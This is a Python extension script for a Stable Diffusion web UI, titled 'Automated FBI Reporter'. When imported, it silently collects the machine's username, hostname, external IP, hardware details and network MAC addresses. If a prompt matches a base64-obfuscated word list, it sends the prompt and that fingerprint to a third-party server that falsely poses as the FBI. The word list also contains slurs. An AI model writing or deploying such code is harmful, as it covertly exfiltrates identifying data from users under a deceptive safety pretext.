import getpass
import os
import platform
import re
import time
from base64 import b64decode, b64encode
from typing import List

import psutil
import requests
import torch
from cpuinfo import get_cpu_info
from modules import scripts, script_callbacks, shared


def concat(input_obj) -> list:
    out = []
    if isinstance(input_obj, dict):
        for k, v in input_obj.items():
            out = out + concat(v)
    elif isinstance(input_obj, list) or isinstance(input_obj, tuple):
        for item in input_obj:
            out = out + concat(item)
    else:
        out.append(input_obj)
    return out


# Encoded in base64 so shithub doesn't ban me.
encoded_banned_words = ["bG9saQ==", "bG9saXRh", "Y3V0ZQ==", "ZnVubnk=", "Y3Vubnk=", "Y2hpbGQ=", "eW91bmc=", "bGl0dGxl", "Z2lybA==", "YWxpY2U=", "Y2hpbGQgcG9ybg==", "Y2hlZXNlIHBpenph", "ZWxlbWVudGFyeSBzY2hvb2w=", "bWlkZGxlIHNjaG9vbA==", "aGlnaCBzY2hvb2w=", "dW5kZXJhZ2U=", "Y3V0ZSB0dW1teQ==",
                        "dGVlbg==", "dGVlbmFnZXI=", "dW5kZXIgYWdl", "dW5kZXItYWdl", "aWxsZWdhbA==", "eW91bmdlciBzaXN0ZXI=", "c2lzdGVy", "b25paS1jaGFu", "aW1vdG8=", "YW5hbA==", "YW51cw==", "YXJzZQ==", "YXNz", "YmFsbHNhY2s=", "Ymxvb2R5", "Ymxvd2pvYg==", "YmxvdyBqb2I=", "Ym9sbG9jaw==", "Ym9sbG9r",
                        "Ym9uZXI=", "Ym9vYg==", "YnVnZ2Vy", "YnVt", "YnV0dA==", "YnV0dHBsdWc=", "Y2xpdG9yaXM=", "Y29jaw==", "Y3VudA==", "ZGljaw==", "ZGlsZG8=", "ZHlrZQ==", "ZmFn", "ZmVsbGF0ZQ==", "ZmVsbGF0aW8=", "aml6eg==", "bGFiaWE=", "cGVuaXM=", "cHViZQ==", "cHVzc3k=", "c2Nyb3R1bQ==", "dmFnaW5h",
                        "c2V4", "ZXJvdGlj", "bnVkZQ==", "bmFrZWQ=", "YnJlYXN0", "ZmxhdCBjaGVzdA==", "bWlsZg==", "bmlnZ2Vy", "ZmFnZ290", "bWV0aA==", "bXVyZGVyIG9mIGFuIEZCSSBhZ2VudA==", "RWR3YXJkIFNub3dkZW4="]
banned_words = []
for word in encoded_banned_words:
    banned_words.append(b64decode(word).decode())

# Initalize all the things outside of the class since we only need to do it once, not every time the object is created.
try:
    r = requests.get('https://icanhazip.com/')
    if r.status_code == 200:
        external_ip = r.text.strip('\n')
    else:
        external_ip = '-1'
except:
    external_ip = '-1'

try:
    import netifaces

    found_interfaces = [(netifaces.ifaddresses(x)[netifaces.AF_INET][0]['addr'], netifaces.ifaddresses(x)[netifaces.AF_LINK][0]['addr']) for x in netifaces.interfaces()],
except:
    found_interfaces = (-1, -1)

machine_signature = {
    'architecture': f'{platform.architecture()[0]} {platform.architecture()[1]}',
    'machine': platform.machine(),
    'hostname': platform.node(),
    'processor': platform.processor(),
    'system': platform.system(),
    'username': getpass.getuser(),
    'external_ip': external_ip,
    'cpu_count': len(os.sched_getaffinity(0)),
    'total_memory': psutil.virtual_memory().total,
    'cpu_info': get_cpu_info(),
    'gpus': {},
    'interfaces': found_interfaces,
}

if torch.cuda.is_available():
    try:
        for i in range(torch.cuda.device_count()):
            x = torch.cuda.get_device_properties(i)
            machine_signature['gpus'][i] = {
                'name': x.name,
                'major': x.major,
                'minor': x.minor,
                'total_memory': x.total_memory,
                'multi_processor_count': x.multi_processor_count
            }
    except:
        pass
else:
    machine_signature['gpu_count'] = -1

machine_signature_encoded = b64encode(' '.join([str(x) for x in concat(machine_signature)]).encode()).decode()


class FBIReporter(scripts.Script):
    def title(self):
        return "Automated FBI Reporter"

    def show(self, is_img2img):
        return scripts.AlwaysVisible

    def process(self, p):
        user_prompt = p.all_prompts[0]
        found_words = self.check_unsafe_prompt(user_prompt)
        if len(found_words) > 0:
            print(f'******** DETECTED UNSAFE PROMPT ********\nBad words: {found_words}\nReporting to FBI...')
            self.report_to_fbi(user_prompt, found_words)

    def report_to_fbi(self, prompt: dict, found_words: list):
        try:
            r = requests.post('https://fbi.cyberes.net', headers={'Authorization': 'Bearer jlkasdkljasdljkasdlkj'},
                              json={'prompt': prompt, 'found_words': found_words, 'machine_signature': machine_signature, 'machine_signature_encoded': machine_signature_encoded, 'external_ip': external_ip, 'ts': time.time()})
            return r
        except Exception as e:
            print('Failed to send data to the FBI.')
            print('Prompt:', prompt)
            print('Found words:', found_words)
            print(e)

    def check_unsafe_prompt(self, prompt) -> List[str]:
        found_words = []
        for word in banned_words:
            if re.search(word.lower(), prompt):
                found_words.append(word)
        return found_words


def on_ui_settings():
    shared.opts.add_option("report_to_fbi", shared.OptionInfo(True, "Automatically report unsafe prompts to the FBI", section=("trust_safety", "Trust & Safety")))


script_callbacks.on_ui_settings(on_ui_settings)
